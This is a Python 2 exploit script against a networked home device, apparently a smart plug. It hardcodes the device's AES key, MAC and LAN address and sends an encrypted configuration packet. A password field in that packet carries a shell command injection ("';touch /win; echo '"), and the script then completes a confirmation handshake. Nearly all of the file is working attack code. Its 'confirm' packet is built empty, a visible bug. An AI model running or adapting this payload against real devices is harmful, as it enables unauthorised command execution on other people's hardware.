#!/usr/bin/python
import os, sys, re, socket, IPython, time, select
from Crypto.Cipher import AES
from IPython import embed;
from socket import *

KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo"
MAC_ADDR = "00:15:61:bd:82:91"
IP_ADDR = "192.168.10.253"
SOCK_TIMEOUT = 1
RETRY = 0
RPORT = 37092

def stdout (t, m):
        if (t is "+"):
                print "\x1b[32;1m[+]\x1b[0m\t" + m + "\n",
        elif (t is "-"):
                print "\x1b[31;1m[-]\x1b[0m\t" + m + "\n",
        elif (t is "*"):
                print "\x1b[34;1m[*]\x1b[0m\t" + m + "\n",
        elif (t is "!"):
                print "\x1b[33;1m[!]\x1b[0m\t" + m + "\n",

def sanitizeByte (byte):
	if byte == '0x0':
		return '0'
	elif 30 > ord(byte) or ord(byte) > 128:
		return '.'
	elif 30 < ord(byte) or ord(byte) < 128:
		return byte

def createDump (data):
        dump, by, hx, temp = '', [], [], ''
        unprint = list(data)
        for el in unprint:
                hx.append(el.encode("hex"))
                by.append(sanitizeByte(el))
        i = 0
        while i < len(hx):
                if (len(hx) - i ) >= 16:
                        dump += ' '.join(hx[i:i+16])
                        dump += "         "
                        dump += ' '.join(by[i:i+16])
                        dump += "\n"
                        i = i + 16
                else:
                        dump += ' '.join(hx[i:(len(hx) - 1)])
                        pad = len(' '.join(hx[i:(len(hx) - 1)]))
                        dump += ' ' * (56 - pad)
                        dump += ' '.join(by[i:(len(hx) - 1)])
                        dump += "\n"
                        i = i + len(hx)
        return dump

class cryptosock:
        def __init__(self, sock=None):
                if sock is None:
                        self.sock = socket(
                        AF_INET, SOCK_STREAM)
			self.sock.settimeout(SOCK_TIMEOUT)
                else:
                        self.sock = sock
		self.key = AES.new(KEY, AES.MODE_ECB, )
        def connect(self, host, port):
                self.sock.connect((host, port))
        def txnc(self, msg, rhost, rport):
                self.sock.sendto(self.key.encrypt(msg),(rhost,rport))
	def tx(self, msg):
		self.sock.send(self.key.encrypt(msg))
        def rx(self):
		try:
	                msg = self.sock.recv(1024)
			if len(msg) > 1:
		                return self.key.decrypt(msg)
		except:
			stdout("-","timed out")
			return 1

def getPacket(t,e=None, mac = MAC_ADDR, name = "lan_phone", password = "nopassword", on_time=None, off_time=None):
	d,c = "%",""
	if t == "inject":
		c = "phone%pina';touch /win; echo 'lol%pineapplekey%nopassword%name%GMT-0600"
	while len(c) % 16 is not 0:
		c = c + "\x00"
	return c

def txrx (ip, port, t, rt = 1):
        sock = cryptosock()
        sock.connect(ip, port)
        sock.tx(t)
	if rt == 1:
	        r = sock.rx()
	        if (r is not None):
	                return r
	        else:
	                return None
	else:
		return 0

def sendAndConfirm(op):
	m = getPacket(op)
	i = 0
	j = 0
	max_retry = RETRY
	while i == 0:
		if j > max_retry:
			break
		elif 0 < j:
			stdout("!","retrying " + str(j) + "/" + str(max_retry))
		stdout("*","tx\n"+createDump(m))
		ret = txrx(IP_ADDR,RPORT,m)
		if ret is not 1:
			stdout("*","rx\n" + createDump(ret))
			p = re.compile(".*?(\d\d\d\d\d).*?")
			q = p.match(ret)
			if q is not None:
				m = getPacket("confirm",q.group(1))
				stdout("*","\n"+createDump(m))
		                get = txrx(IP_ADDR,RPORT,m)
		                stdout("*","\n" + createDump(get))
				i = 1
			else:
				i = 1
		else:
			j = j + 1

def inject():
	sendAndConfirm("inject")

inject()
